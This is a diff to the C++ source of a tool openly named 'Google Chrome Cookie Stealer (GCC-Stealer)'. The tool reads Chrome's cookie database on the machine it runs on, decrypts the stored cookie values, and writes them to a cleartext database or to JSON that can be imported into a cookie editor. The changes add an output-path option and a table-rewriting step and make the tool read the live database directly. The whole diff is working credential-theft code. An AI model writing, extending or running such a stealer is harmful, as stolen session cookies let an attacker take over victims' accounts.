@@ -35,8 +35,7 @@
 
 #define KEY_LEN      16
 
-
-
+#define GCC_STEALER_VERSION "1.1"
 
 #ifdef _WIN32
 // old "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
@@ -68,16 +67,16 @@ std::vector<std::string> possibleBrowserPaths = {
 namespace fs = std::filesystem;
 
 static bool quiet = false;
-argparse::ArgumentParser programArgs;
+static argparse::ArgumentParser programArgs;
 
 using cookie_vector_t = std::vector<std::tuple<std::string, std::string, std::vector<unsigned char>, std::string>>;
 
-cookie_vector_t get_encrypted_cookies_vector(const char* db_path) {
+cookie_vector_t get_encrypted_cookies_vector(std::string_view db_path) {
     
     sqlite3* DB;
     auto sol_vector = cookie_vector_t();
 
-    if (sqlite3_open_v2(db_path, &DB, SQLITE_OPEN_READONLY, NULL)) {
+    if (sqlite3_open_v2(db_path.data(), &DB, SQLITE_OPEN_READONLY, NULL)) {
         std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
         exit(-1);
     }
@@ -403,25 +402,26 @@ void decrypt_cookies(cookie_vector_t* cookie_vector)
     } 
 }
 
-
-int update_decrypted_DB(cookie_vector_t cookie_vector, const char* db_path) {
+/* This function sets value with the decrypted value and empties encrypted_value*/
+int update_decrypted_DB(cookie_vector_t& cookie_vector, std::string_view db_path) {
     sqlite3* DB;
     
     char sql[4000];
 
     int exit = 0;
-    exit = sqlite3_open(db_path, &DB);
+    exit = sqlite3_open(db_path.data(), &DB);
     char* zErrMsg = 0;
 
     if (exit) {
         std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
         return -1;
     }
-    else
+    else {
         std::cout << "Updating DB rows with decrypted values. This may take a while..." << std::endl;
+    }
 
     /* Create merged SQL statement */
-    auto format = "UPDATE cookies SET encrypted_value = '%s' where host_key='%s' AND name='%s'";
+    auto format = "UPDATE cookies SET value = '%s', encrypted_value = '' WHERE host_key='%s' AND name='%s'";
 
     for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : cookie_vector) {
         snprintf(sql, sizeof(sql), format, decrypted_value.c_str(), host_key.c_str(), cookie_name.c_str());
@@ -429,17 +429,80 @@ int update_decrypted_DB(cookie_vector_t cookie_vector, const char* db_path) {
         auto rc = sqlite3_exec(DB, sql, NULL, NULL, &zErrMsg);
     }
 
+    sqlite3_close(DB);
+
+    return 0;
+}
+
+int cbSelect(void* data, int ncols, char** values, char** headers)
+{
+    std::cout << ncols << " " << values << std::endl;
+    return 0;
+}
+
+int alter_cookies_table(std::string_view db_path) {
+    sqlite3* DB;
+
+    const char* sql = R"V0G0N(PRAGMA foreign_keys=off;
+
+    ALTER TABLE cookies RENAME TO _cookies_old;
+
+    CREATE TABLE "cookies" (
+	    "creation_utc"	INTEGER NOT NULL,
+	    "host_key"	TEXT NOT NULL,
+	    "top_frame_site_key"	TEXT NOT NULL,
+	    "name"	TEXT NOT NULL,
+	    "value"	TEXT NOT NULL,
+	    "encrypted_value"	BLOB,
+	    "path"	TEXT NOT NULL,
+	    "expires_utc"	INTEGER NOT NULL,
+	    "is_secure"	INTEGER NOT NULL,
+	    "is_httponly"	INTEGER NOT NULL,
+	    "last_access_utc"	INTEGER NOT NULL,
+	    "has_expires"	INTEGER NOT NULL,
+	    "is_persistent"	INTEGER NOT NULL,
+	    "priority"	INTEGER NOT NULL,
+	    "samesite"	INTEGER NOT NULL,
+	    "source_scheme"	INTEGER NOT NULL,
+	    "source_port"	INTEGER NOT NULL,
+	    "is_same_party"	INTEGER NOT NULL,
+	    "last_update_utc"	INTEGER NOT NULL
+    );
+
+    INSERT INTO cookies ("creation_utc","expires_utc","has_expires","host_key","is_httponly","is_persistent","is_same_party","is_secure","last_access_utc","last_update_utc","name","path","priority","samesite","source_port","source_scheme","top_frame_site_key","value")
+      SELECT "creation_utc","expires_utc","has_expires","host_key","is_httponly","is_persistent","is_same_party","is_secure","last_access_utc","last_update_utc","name","path","priority","samesite","source_port","source_scheme","top_frame_site_key","value"
+      FROM _cookies_old;
+
+    PRAGMA foreign_keys=on;)V0G0N";
+
+    if (sqlite3_open_v2(db_path.data(), &DB, SQLITE_OPEN_READWRITE, NULL)) {
+        std::cerr << "Error opening DB " << sqlite3_errmsg(DB) << std::endl;
+        exit(-1);
+    }
+    else {
+        std::cout << "Updating encrypted_value column so it can hold NULL" << std::endl;
+    }
+  
+    char* zErrMsg = NULL;
+    if (SQLITE_OK != sqlite3_exec(DB, sql, cbSelect, NULL, &zErrMsg)) {
+        std::cout << "[!!] Error changing altering encrypted_value column to accept NULL. " << zErrMsg << std::endl;
+        exit(-1);
+    }
+
+    if (SQLITE_OK != sqlite3_close(DB)) {
+        std::cout << "[!!] Error closing DB" << std::endl;
+        exit(-1);
+    }
+
     return 0;
 }
 
 
 void argsHandling(int argc, char** argv) {
-    programArgs = argparse::ArgumentParser("Google Chrome Cookie Stealer (GCC-Stealer)");
+    programArgs = argparse::ArgumentParser("GCC-stealer.exe", GCC_STEALER_VERSION);
 
-    programArgs.add_argument("--verbose")
-        .help("increase output verbosity")
-        .default_value(false)
-        .implicit_value(true);
+    programArgs.add_description("Google Chrome Cookie Stealer (GCC-Stealer)");
+    programArgs.add_epilog("It must be run on the same system you want to decrypt the cookies from");
 
     programArgs.add_argument("--json-print")
         .help("print a JSON structure with the decrypted cookies you can import in Cookie-Editor")
@@ -450,8 +513,13 @@ void argsHandling(int argc, char** argv) {
         .help("create a JSON file with the decrypted cookies you can import in Cookie-Editor")
         .default_value(std::string{ "cookies.json" });
 
+    programArgs.add_argument("--cookies-out")
+        .help("path where to write decrypted cookies DB to")
+        .default_value(std::string{ "Cookies_decrypted" });
+
     programArgs.add_argument("--cookies-path")
         .help("tell GCC-Stealer where to look for the cookies DB");
+
 
     try {
         programArgs.parse_args(argc, argv);
@@ -501,31 +569,27 @@ int main(int argc, char** argv)
     auto username = getenv("HOME");    
 #endif //_WIN32
     char cookies_path[PATH_MAX] = { 0 };
-    snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, username);
-
-    // ToDo: Use the list of found browsers and decrypt all
-    auto possibleCookies = findChrome(possibleBrowserPaths, username);
-
-    std::error_code err;
+    
+    // Find profiles and other Chrome based browsers
+    [[maybe_unused]] auto possibleCookies = findChrome(possibleBrowserPaths, username);
+    
     if (programArgs.is_used("--cookies-path")) {
-        auto cookies_path = fs::path(programArgs.get<std::string>("--cookies-path"));
-        if (!cookies_path.has_filename()) {
-            std::cerr << "Make sure that " << cookies_path << " exists in the system" << std::endl;
-            exit(-1);
-        }
-        fs::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);
+        auto user_provided_cookies_path = programArgs.get<std::string>("--cookies-path");
+        memcpy_s(cookies_path, PATH_MAX, user_provided_cookies_path.c_str(), user_provided_cookies_path.size());
     }
     else {
-        fs::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);
+        snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, username);
     }
 
-    if (err) {
-        std::cerr << "Error finding the cookie DB. Try option --cookies-path and set it to the DB" << std::endl;
-        std::cerr << err.message() << std::endl;
-        return -1;
-    }
+    if (!fs::path(cookies_path).has_filename()) {
+        std::cerr << "Make sure that " << cookies_path << " exists in the system or try option --cookies-path and set it to the DB" << std::endl;
+        exit(-1);
+    }    
+    
+    std::cout << "Using \"" << cookies_path << "\" as target to decrypt cookies" << std::endl;
 
-    auto cookies_vector = get_encrypted_cookies_vector("Cookies_decrypted");
+    // Open Chrome/Brave DB
+    auto cookies_vector = get_encrypted_cookies_vector(cookies_path);
     
     if (cookies_vector.empty()) {
         std::cerr << "[!] Couldn't get cookies values" << std::endl;
@@ -534,13 +598,29 @@ int main(int argc, char** argv)
 
     decrypt_cookies(&cookies_vector);
 
-    // Update Cookies_decrypted with the decrypted values of the cookies
-    if (update_decrypted_DB(cookies_vector, "Cookies_decrypted") == 0) {
-        std::cout << "Database 'Cookies_decrypted' has been properly created with decrypted values" << std::endl;
-    }
-    else {
-        std::cerr << "[!!] Some error occured while creating cleartext Cookies DB" << std::endl;
-        return -1;
+    
+    // Option to create a decrypted version of the sqlite DB
+    if (programArgs.is_used("--cookies-out")) {
+        std::string out_cookies = programArgs.get<std::string>("--cookies-out");
+        std::error_code err;
+        fs::copy(cookies_path, out_cookies, std::filesystem::copy_options::overwrite_existing, err);
+        
+        if (err) {
+            std::cout << "[!!] Couldn't copy " << cookies_path << " to " << out_cookies << " . Error: " << err.message() << std::endl;
+            return -1;
+        }
+
+        // Modify cookies table so encrypted_value can be NULL
+        alter_cookies_table(out_cookies);
+
+        // Update out cookies DB with the decrypted values of the cookies
+        if (update_decrypted_DB(cookies_vector, out_cookies) == 0) {
+            std::cout << "Database " << out_cookies << " updated with cleartext cookie values" << std::endl;
+        }
+        else {
+            std::cerr << "[!!] Some error occured while creating cleartext Cookies DB" << std::endl;
+            return -1;
+        }
     }
 
     return 0;
